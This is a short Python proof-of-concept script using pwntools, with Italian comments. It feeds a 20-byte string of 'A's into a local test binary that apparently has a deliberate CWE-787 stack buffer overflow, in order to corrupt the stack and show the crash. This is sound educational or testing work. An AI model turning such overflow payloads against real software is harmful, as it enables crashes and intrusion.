/**
 * @file Exploit_Stack_Buffer_Overflow.py
 * @brief PoC per CWE-787 Stack Buffer Overflow
 * Target: build/CWE-787 Stack Buffer Overflow
 */
from pwn import *
import sys

# Imposta il livello di log
context.log_level = 'info'

def exploit():
    # Percorso dell'eseguibile vulnerabile
    exe = './build/CWE-787 Stack Buffer Overflow'
    
    # Crea il payload: 10 byte riempiono il buffer + extra per sovrascrivere
    # Esempio: 20 'A' causeranno sicuramente una corruzione dello stack
    payload = b'A' * 20
    
    log.info(f"Esecuzione di {exe} con payload di {len(payload)} byte...")
    
    try:
        # Avvia il processo passando il payload come argomento
        p = process([exe, payload])
        
        # Leggi l'output (se crasha, potremmo non vedere tutto o vedere un segnale)
        output = p.recvall(timeout=2)
        log.info(f"Output del programma:\n{output.decode(errors='ignore')}")
        
        p.close()
            
    except Exception as e:
        log.error(f"Errore durante l'esecuzione: {e}")

if __name__ == "__main__":
    exploit()
